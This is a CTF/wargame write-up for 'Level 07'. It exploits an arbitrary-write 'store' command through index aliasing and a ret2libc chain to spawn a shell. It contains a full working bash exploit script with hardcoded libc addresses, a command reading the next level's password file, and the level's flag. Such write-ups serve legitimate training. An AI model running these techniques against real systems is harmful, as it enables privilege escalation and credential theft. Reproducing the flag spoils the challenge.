# Level 07 — arbitrary-write primitive → ret2libc

## Overview
The binary exposes a `store` command that lets us write a chosen value to a
chosen slot — an **arbitrary write primitive**. By writing into the saved
return area we build a ret2libc chain: `system` → fake return (`exit`) →
`"/bin/sh"`.

## Theory (see `theory.txt`)
An *arbitrary write primitive* is the capability to write attacker-controlled
bytes to an attacker-controlled address. It is not a bug by itself but the
leverage a bug provides — enough to overwrite return addresses or function
pointers and turn a memory flaw into code execution.

## Gathering addresses
```sh
gdb ./level07
(gdb) break main
(gdb) run
(gdb) print system                      # 0xf7e6aed0
(gdb) print exit                        # 0xf7e5eb70
(gdb) find &system, +99999999, "/bin/sh"  # 0xf7f897ec
```

## Index aliasing
The `store` command validates the index: indices divisible by 3 are rejected.
To reach a blocked slot we add `2^30` (`1<<30`), which aliases to the same
effective offset while passing the check:
```sh
alias_idx(){ local n=$1; if (( n % 3 != 0 )); then echo $n; else echo $(( n + (1<<30) )); fi; }
```
The real return index is `N=114`; we write three consecutive slots:
- `I0 = alias(N)`   → `system`
- `I1 = alias(N+1)` → fake return (`exit`)
- `I2 = alias(N+2)` → `"/bin/sh"`

## Exploit script
```sh
cat > /tmp/pwn07.sh << 'EOF'
#!/bin/bash
N=114                   # real return index
SYSTEM=0xf7e6aed0       # p system
FAKERET=0xf7e5eb70      # p exit
BINSH=0xf7f897ec        # find "/bin/sh"
BIN=/home/users/level07/level07

alias_idx(){ local n=$1; if (( n % 3 != 0 )); then echo $n; else echo $(( n + (1<<30) )); fi; }
I0=$(alias_idx $N)
I1=$(alias_idx $((N+1)))
I2=$(alias_idx $((N+2)))

printf '[*] N=%d  I0=%d  I1=%d  I2=%d\n' $N $I0 $I1 $I2
cd /home/users/level07 || exit 1
( printf 'store\n%d\n%d\nstore\n%d\n%d\nstore\n%d\n%d\nquit\n' \
    $((SYSTEM)) $I0 $((FAKERET)) $I1 $((BINSH)) $I2; cat ) | setarch i386 -R "$BIN"
EOF
chmod +x /tmp/pwn07.sh
/tmp/pwn07.sh
```
`setarch i386 -R` disables ASLR so the libc addresses stay valid. `cat` keeps
stdin open for the shell.

## Result
```sh
id
cat /home/users/level08/.pass
```

## Files
- `steps_level07.txt` — full command walkthrough.
- `theory.txt` — notes on the arbitrary-write primitive concept.

## Flag
```
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```
